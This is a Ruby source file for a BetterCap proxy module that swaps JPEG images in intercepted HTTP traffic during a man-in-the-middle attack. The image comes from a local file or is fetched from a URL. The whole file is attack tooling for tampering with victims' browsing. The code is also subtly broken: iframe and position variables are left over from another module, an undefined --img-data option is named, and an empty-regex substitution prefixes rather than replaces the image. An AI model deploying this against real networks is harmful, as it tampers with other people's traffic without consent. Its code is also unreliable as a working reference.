# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end


require 'open-uri'

# This proxy module will take care of Image injection.
class REPLACEIMAGE < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'REPLACE IMAGE',
    'Description' => 'This proxy module will take care of IMAGE file replacement.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  # URL of the iframe if --html-iframe-url was specified.
  @@iframe = nil
  # HTML data to be injected.
  @@data = nil
  # Position of the injection, 0 = just after <body>, 1 = before </body>
  @@position = 0
  # Maximum number of times to inject.
  @@max = 1000000
  # Counter for the number of injections.
  @@cnt = 0

  # Add custom command line arguments to the +opts+ OptionParser instance.
  def self.on_options(opts)
    opts.separator ""
    opts.separator "Replace Image Module Options::"
    opts.separator ""

    opts.on( '--img-file PATH', 'Path of the image file to be injected.' ) do |v|
      filename = File.expand_path v
      raise BetterCap::Error, "#{filename} invalid file." unless File.exists?(filename)
      @@data = File.read( filename )
    end

    opts.on( '--img-url URL', 'URL the image file to be injected.' ) do |v|
        jsonurl = v 
        @@data = open(jsonurl){|io|io.read}
      end    

    opts.on( '--img-max NUM', 'Maximum number of times to inject.' ) do |v|
      @@max = v.to_i
    end
  end

  # Create an instance of this module and raise a BetterCap::Error if command
  # line arguments weren't correctly specified.
  def initialize
    raise BetterCap::Error, "No --img-file, --img-data or --img-url options specified for the proxy module." if @@data.nil? and @@iframe.nil?
  end

  # Called by the BetterCap::Proxy::HTTP::Proxy processor on each HTTP +request+ and
  # +response+.
  def on_request( request, response )
    
    if response.content_type =~ /^image\/jpeg.*/ and ( @@cnt < @@max )
        @@cnt += 1
        BetterCap::Logger.info "[#{'REPLACE JPEG'.green}] Replacing image into #{request.to_url}"
  
        replacement = "#{@@data}"
        
        response.body.sub!( //i ) { "#{replacement}" }
  
      end    
  end
end
